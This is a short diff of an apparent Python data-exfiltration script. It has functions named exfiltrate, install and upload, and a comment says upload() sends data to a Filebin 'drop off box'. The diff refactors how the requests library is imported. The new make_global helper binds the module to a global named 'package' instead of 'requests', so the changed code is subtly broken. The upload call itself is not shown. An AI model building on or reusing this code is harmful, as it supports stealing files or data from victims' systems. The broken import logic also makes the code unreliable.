@@ -63,8 +63,7 @@ def exfiltrate():
         install("requests")
     else:
         # otherwise use the requests library
-        global requests
-        requests = __import__("requests", globals(), locals()) # import requests at global level
+        make_global("requests") # import requests at global level
         upload()
 
 def install(package):
@@ -74,9 +73,12 @@ def install(package):
         print("Pip not installed on system.")
         pass
     else:
-        global requests
-        requests = __import__("requests", globals(), locals()) # import requests at global level
+        make_global("requests") # import requests at global level
         upload()
+
+def make_global(lib):
+    global package
+    package = __import__(lib, globals(), locals())
 
 def upload(): 
     # second storage (upload to drop off box - Filebin)
